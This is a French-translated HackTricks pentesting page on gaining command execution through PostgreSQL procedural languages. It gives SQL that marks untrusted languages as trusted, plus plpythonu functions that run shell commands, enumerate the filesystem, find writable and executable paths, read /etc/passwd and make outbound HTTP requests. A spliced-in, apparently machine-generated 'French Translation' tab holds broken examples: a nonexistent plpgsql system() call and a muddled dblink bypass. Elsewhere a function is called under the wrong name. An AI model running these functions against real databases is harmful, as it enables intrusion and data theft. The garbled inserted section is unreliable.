## Langages PostgreSQL

La base de donn√©es PostgreSQL √† laquelle vous avez acc√®s peut avoir diff√©rents **langages de script install√©s** que vous pouvez exploiter pour **ex√©cuter du code arbitraire**.

Vous pouvez les **faire fonctionner** :
```sql
\dL *

SELECT lanname,lanpltrusted,lanacl FROM pg_language;
```
La plupart des langages de script que vous pouvez installer dans PostgreSQL ont **2 versions**: la version **de confiance** et la version **non de confiance**. La version **non de confiance** aura un nom **terminant par "u"** et sera la version qui vous permettra d'**ex√©cuter du code** et d'utiliser d'autres fonctions int√©ressantes. Voici des langages qui, s'ils sont install√©s, sont int√©ressants:

* **plpythonu**
* **plpython3u**
* **plperlu**
* **pljavaU**
* **plrubyu**
* ... (tout autre langage de programmation utilisant une version non s√©curis√©e)

{% hint style="warning" %}
Si vous trouvez qu'un langage int√©ressant est **install√©** mais **non de confiance** par PostgreSQL (**`lanpltrusted`** est **`false`**), vous pouvez essayer de **lui faire confiance** avec la ligne suivante afin qu'aucune restriction ne soit appliqu√©e par PostgreSQL:
```sql
UPDATE pg_language SET lanpltrusted=true WHERE lanname='plpythonu';
# To check your permissions over the table pg_language
SELECT * FROM information_schema.table_privileges WHERE table_name = 'pg_language';
```
{% endhint %}

{% hint style="danger" %}
Si vous ne voyez pas une langue, vous pouvez essayer de la charger avec (**vous devez √™tre superadmin**):
```
CREATE EXTENSION plpythonu;
CREATE EXTENSION plpython3u;
CREATE EXTENSION plperlu;
CREATE EXTENSION pljavaU;
CREATE EXTENSION plrubyu;
```
{% endhint %}

Notez qu'il est possible de compiler les versions s√©curis√©es en "non s√©curis√©es". Consultez [**ce lien**](https://www.robbyonrails.com/articles/2005/08/22/installing-untrusted-pl-ruby-for-postgresql.html) par exemple. Il vaut donc toujours la peine d'essayer si vous pouvez ex√©cuter du code m√™me si vous ne trouvez que la version **de confiance** install√©e.

## plpythonu/plpython3u

{% tabs %}
{% tab title="RCE" %}
```sql
CREATE OR REPLACE FUNCTION exec (cmd text)
RETURNS VARCHAR(65535) stable
AS $$
    import os
    return os.popen(cmd).read()
    #return os.execve(cmd, ["/usr/lib64/pgsql92/bin/psql"], {})
$$
LANGUAGE 'plpythonu';

SELECT cmd("ls"); #RCE with popen or execve
```
{% endtab %}

{% tab title="Obtenir l'utilisateur du syst√®me d'exploitation" %}
```sql
CREATE OR REPLACE FUNCTION get_user (pkg text)
RETURNS VARCHAR(65535) stable
AS $$
    import os
    return os.getlogin()
$$
LANGUAGE 'plpythonu';

SELECT get_user(""); #Get user, para is useless
```
{% endtab %}

{% tab title="List dir" %}Lister le r√©pertoire{% endtab %}
```sql
CREATE OR REPLACE FUNCTION lsdir (dir text)
RETURNS VARCHAR(65535) stable
AS $$
    import json
    from os import walk
    files = next(walk(dir), (None, None, []))
    return json.dumps({"root": files[0], "dirs": files[1], "files": files[2]})[:65535]
$$
LANGUAGE 'plpythonu';

SELECT lsdir("/"); #List dir
```
{% endtab %}

{% tab title="Trouver le dossier W" %}
```sql
CREATE OR REPLACE FUNCTION findw (dir text)
RETURNS VARCHAR(65535) stable
AS $$
    import os
    def my_find(path):
        writables = []
        def find_writable(path):
            if not os.path.isdir(path):
                return
            if os.access(path, os.W_OK):
                writables.append(path)
            if not os.listdir(path):
                return
            else:
                for item in os.listdir(path):
                    find_writable(os.path.join(path, item))
        find_writable(path)
        return writables
    
    return ", ".join(my_find(dir))
$$
LANGUAGE 'plpythonu';

SELECT findw("/"); #Find Writable folders from a folder (recursively)
```
{% endtab %}

{% tab title="Trouver un fichier" %}
```sql
CREATE OR REPLACE FUNCTION find_file (exe_sea text)
RETURNS VARCHAR(65535) stable
AS $$
    import os
    def my_find(path):
        executables = []
        def find_executables(path):
            if not os.path.isdir(path):
                executables.append(path)
            
            if os.path.isdir(path):
                if not os.listdir(path):
                    return
                else:
                    for item in os.listdir(path):
                        find_executables(os.path.join(path, item))
        find_executables(path)
        return executables
    
    a = my_find("/")
    b = []

    for i in a:
        if exe_sea in os.path.basename(i):
            b.append(i)
    return ", ".join(b)
$$
LANGUAGE 'plpythonu';

SELECT find_file("psql"); #Find a file
```
{% endtab %}

{% tab title="Trouver des ex√©cutables" %}
```sql
CREATE OR REPLACE FUNCTION findx (dir text)
RETURNS VARCHAR(65535) stable
AS $$
    import os
    def my_find(path):
        executables = []
        def find_executables(path):
            if not os.path.isdir(path) and os.access(path, os.X_OK):
                executables.append(path)
            
            if os.path.isdir(path):
                if not os.listdir(path):
                    return
                else:
                    for item in os.listdir(path):
                        find_executables(os.path.join(path, item))
        find_executables(path)
        return executables
    
    a = my_find(dir)
    b = []

    for i in a:
        b.append(os.path.basename(i))
    return ", ".join(b)
$$
LANGUAGE 'plpythonu';

SELECT findx("/"); #Find an executables in folder (recursively)
```
{% endtab %}

{% tab title="Trouver exec par subs" %}
```sql
CREATE OR REPLACE FUNCTION find_exe (exe_sea text)
RETURNS VARCHAR(65535) stable
AS $$
    import os
    def my_find(path):
        executables = []
        def find_executables(path):
            if not os.path.isdir(path) and os.access(path, os.X_OK):
                executables.append(path)
            
            if os.path.isdir(path):
                if not os.listdir(path):
                    return
                else:
                    for item in os.listdir(path):
                        find_executables(os.path.join(path, item))
        find_executables(path)
        return executables
    
    a = my_find("/")
    b = []

    for i in a:
        if exe_sea in i:
            b.append(i)
    return ", ".join(b)
$$
LANGUAGE 'plpythonu';

SELECT find_exe("psql"); #Find executable by susbstring
```
{% endtab %}

{% tab title="French Translation" %}
# RCE avec les langages PostgreSQL

Il est possible d'ex√©cuter du code arbitraire en utilisant les langages de programmation pris en charge par PostgreSQL. Pour cela, il faut que l'utilisateur ait les privil√®ges n√©cessaires pour cr√©er des fonctions dans la base de donn√©es.

## Cr√©ation d'une fonction

La premi√®re √©tape consiste √† cr√©er une fonction qui ex√©cute le code que nous voulons. Par exemple, pour ex√©cuter la commande `id`, nous pouvons cr√©er la fonction suivante :

```sql
CREATE OR REPLACE FUNCTION rce() RETURNS text AS $$
    BEGIN
        RETURN '' || system('id') || '';
    END;
$$ LANGUAGE plpgsql;
```

Cette fonction utilise la fonction `system()` pour ex√©cuter la commande `id` et renvoyer le r√©sultat.

## Ex√©cution de la fonction

Une fois que la fonction est cr√©√©e, nous pouvons l'ex√©cuter en utilisant la commande `SELECT`. Par exemple :

```sql
SELECT rce();
```

Cela ex√©cutera la fonction `rce()` et renverra le r√©sultat de la commande `id`.

## Utilisation de langages de programmation suppl√©mentaires

PostgreSQL prend en charge plusieurs langages de programmation, notamment PL/Python, PL/Perl et PL/Tcl. Pour utiliser ces langages, il faut les installer et les activer dans la base de donn√©es.

Par exemple, pour utiliser PL/Python, il faut installer le module `plpython3u` et activer la langue dans la base de donn√©es :

```sql
CREATE EXTENSION plpython3u;
```

Ensuite, nous pouvons cr√©er une fonction qui utilise le langage PL/Python pour ex√©cuter du code Python :

```sql
CREATE OR REPLACE FUNCTION rce_python() RETURNS text AS $$
    import subprocess
    return subprocess.check_output(['id']).decode()
$$ LANGUAGE plpython3u;
```

Cette fonction utilise le module `subprocess` pour ex√©cuter la commande `id` et renvoyer le r√©sultat.

Nous pouvons ensuite l'ex√©cuter en utilisant la commande `SELECT` :

```sql
SELECT rce_python();
```

Cela ex√©cutera la fonction `rce_python()` et renverra le r√©sultat de la commande `id`.

## Contournement des restrictions de s√©curit√©

Dans certains cas, l'utilisateur peut ne pas avoir les privil√®ges n√©cessaires pour cr√©er des fonctions dans la base de donn√©es. Dans ce cas, il est possible d'utiliser une fonction existante qui a les privil√®ges n√©cessaires.

Par exemple, la fonction `dblink_connect()` peut √™tre utilis√©e pour se connecter √† une autre base de donn√©es. Cette fonction a les privil√®ges n√©cessaires pour ex√©cuter du code arbitraire dans la base de donn√©es distante.

Nous pouvons utiliser cette fonction pour ex√©cuter du code arbitraire dans la base de donn√©es locale en cr√©ant une fonction qui se connecte √† la base de donn√©es locale et ex√©cute le code :

```sql
CREATE OR REPLACE FUNCTION rce_dblink() RETURNS text AS $$
    SELECT dblink_connect('host=localhost user=postgres password=postgres dbname=postgres');
    SELECT dblink_exec('SELECT * FROM rce()');
$$ LANGUAGE sql;
```

Cette fonction se connecte √† la base de donn√©es locale en utilisant les informations d'identification par d√©faut et ex√©cute la fonction `rce()` en utilisant la fonction `dblink_exec()`. Le r√©sultat est renvoy√© √† la base de donn√©es distante.

Nous pouvons ensuite ex√©cuter cette fonction dans la base de donn√©es distante en utilisant la commande `SELECT` :

```sql
SELECT rce_dblink();
```

Cela ex√©cutera la fonction `rce_dblink()` et renverra le r√©sultat de la commande `id`.
```sql
CREATE OR REPLACE FUNCTION read (path text)
RETURNS VARCHAR(65535) stable
AS $$
    import base64
    encoded_string= base64.b64encode(open(path).read())
    return encoded_string.decode('utf-8')
    return open(path).read()
$$
LANGUAGE 'plpythonu';

select read('/etc/passwd'); #Read a file in b64
```
{% endtab %}

{% tab title="Obtenir les permissions" %}
```sql
CREATE OR REPLACE FUNCTION get_perms (path text)
RETURNS VARCHAR(65535) stable
AS $$
    import os
    status = os.stat(path)
    perms = oct(status.st_mode)[-3:]
    return str(perms)
$$
LANGUAGE 'plpythonu';

select get_perms("/etc/passwd"); # Get perms of file
```
{% endtab %}

{% tab title="Requ√™te" %}
```sql
CREATE OR REPLACE FUNCTION req2 (url text)
RETURNS VARCHAR(65535) stable
AS $$
    import urllib
    r = urllib.urlopen(url)
    return r.read()
$$
LANGUAGE 'plpythonu';

SELECT req2('https://google.com'); #Request using python2

CREATE OR REPLACE FUNCTION req3 (url text)
RETURNS VARCHAR(65535) stable
AS $$
    from urllib import request
    r = request.urlopen(url)
    return r.read()
$$
LANGUAGE 'plpythonu';

SELECT req3('https://google.com'); #Request using python3
```
## pgSQL

Consultez la page suivante:

{% content-ref url="pl-pgsql-password-bruteforce.md" %}
[pl-pgsql-password-bruteforce.md](pl-pgsql-password-bruteforce.md)
{% endcontent-ref %}

## C

Consultez la page suivante:

{% content-ref url="rce-with-postgresql-extensions.md" %}
[rce-with-postgresql-extensions.md](rce-with-postgresql-extensions.md)
{% endcontent-ref %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©**? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks**? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF**? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
